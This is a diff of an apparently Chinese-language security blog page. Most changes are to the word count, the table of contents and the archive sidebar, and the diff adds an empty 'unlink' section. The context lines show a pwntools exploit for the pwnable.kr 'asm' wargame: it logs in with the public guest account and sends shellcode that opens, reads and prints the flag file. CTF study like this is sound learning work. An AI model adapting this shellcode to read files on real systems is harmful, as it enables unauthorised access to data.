@@ -261,7 +261,7 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">2,441</span> / Reading time: <span class="post-count">13 min</span></span>
+                        <span>Word count: <span class="post-count">2,444</span> / Reading time: <span class="post-count">13 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -414,6 +414,7 @@
 <p>大体上就是将部分寄存器的值清0。</p>
 <p>直接操作:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"></span><br><span class="line">p = ssh(host=&quot;pwnable.kr&quot;, port=2222, user=&quot;asm&quot;, password=&quot;guest&quot;)</span><br><span class="line">io = p.connect_remote(&quot;0&quot;, 9026)</span><br><span class="line"></span><br><span class="line">shellcode = &apos;&apos;</span><br><span class="line">shellcode += shellcraft.open(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.read(&quot;rax&quot;, &quot;rsp&quot;, 100)          // </span><br><span class="line">shellcode += shellcraft.write(1, &apos;rsp&apos;, 100)</span><br><span class="line">io.recvuntil(&quot;code:&quot;)</span><br><span class="line">io.send(asm(shellcode))</span><br><span class="line">print io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
     </article>
     <!-- license  -->
@@ -552,7 +553,7 @@
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">3.</span> <span class="toc-text">asm</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Uaf"><span class="toc-number">1.</span> <span class="toc-text">Uaf</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#memcpy"><span class="toc-number">2.</span> <span class="toc-text">memcpy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#asm"><span class="toc-number">3.</span> <span class="toc-text">asm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink"><span class="toc-number">4.</span> <span class="toc-text">unlink</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -565,56 +566,6 @@
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     
     
     
@@ -1449,12 +1400,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
         </li>
     
     
@@ -1579,12 +1530,12 @@
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
         </li>
     
     
@@ -1670,11 +1621,11 @@
     
         <span class="sidebar-tag-name" data-tags="python安全"><span class="iconfont-archer">&#xe606;</span>python安全</span>
     
+        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
+    
         <span class="sidebar-tag-name" data-tags="zookeeper"><span class="iconfont-archer">&#xe606;</span>zookeeper</span>
     
         <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
-    
-        <span class="sidebar-tag-name" data-tags="前端"><span class="iconfont-archer">&#xe606;</span>前端</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
